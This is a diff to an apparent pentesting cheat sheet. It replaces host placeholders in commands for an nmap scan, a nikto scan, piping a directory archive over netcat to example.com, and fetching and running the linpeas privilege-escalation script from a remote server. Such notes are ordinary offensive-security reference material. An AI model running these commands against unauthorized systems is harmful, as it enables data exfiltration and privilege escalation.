@@ -1,6 +1,6 @@
 ## Network scan with`nmap`:
 ```bash
-nmap -v -sV -O -A --top-ports 5000 -oN nmap_output.txt <host>
+nmap -v -sV -O -A --top-ports 5000 -oN nmap_output.txt example.com
 ```
 
 ## Directory enumeration with `dirb`:
@@ -27,7 +27,7 @@ nikto -h http://example.com -p 8080 -o nikto_output.txt
 ### Sender:
 ```bash
 tar -czf directory.tar.gz ./directory
-cat directory.tar.gz | nc <host> 1234
+cat directory.tar.gz | nc example.com 1234
 ```
 ### Receiver:
 ```bash
@@ -43,7 +43,7 @@ sudo python3 -m http.server 8080
 ### Receiver
 ```bash
 cd /tmp
-wget <host>:8080/linpeas.sh
+wget x.x.x.x:8080/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh -a > ./output.txt
 less -r ./output.txt
